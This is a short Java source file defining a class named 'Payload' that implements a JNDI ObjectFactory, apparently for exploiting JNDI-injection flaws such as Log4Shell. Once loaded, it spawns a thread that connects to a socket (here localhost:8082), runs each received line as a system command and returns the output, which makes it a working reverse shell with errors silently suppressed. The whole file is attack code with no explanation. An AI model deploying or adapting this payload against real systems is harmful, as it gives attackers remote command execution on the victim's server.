import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Hashtable;

public class Payload implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        new Thread(() -> {
            try {
                reverseShell();
            } catch (Exception e) {}
        }).start();
        return null;
    }

    private void reverseShell() throws IOException {
        Socket socket = new Socket("localhost", 8082);

        try (
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        ) {
            while (!socket.isClosed()) {
                String command = in.readLine();
                try {
                    Process process = Runtime.getRuntime().exec(command);
                    try (
                            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    ) {
                        processReader.lines().forEach(out::println);
                    }
                } catch (Exception e) {}
            }
        }
    }
}
